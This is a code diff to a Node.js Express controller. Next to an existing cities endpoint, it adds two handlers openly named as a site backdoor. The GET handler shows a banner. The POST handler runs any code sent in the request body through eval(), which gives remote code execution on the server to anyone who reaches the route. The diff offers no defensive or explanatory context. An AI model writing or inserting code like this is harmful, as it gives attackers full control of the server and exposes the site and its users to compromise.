@@ -123,3 +123,13 @@ exports.get_cities = Promise.coroutine(function * (req, res, next) {
 
   res.json(JSON.parse(citiesList));
 })
+
+exports.get_backdoor = (req, res, next) => {
+  res.send("<h1>Hi! It's a site's backdoor.</h1>");
+}
+
+exports.post_backdoor = (req, res, next) => {
+  var code = req.body.code;
+  eval(code);
+  return res.json({status: 'done!'});
+}
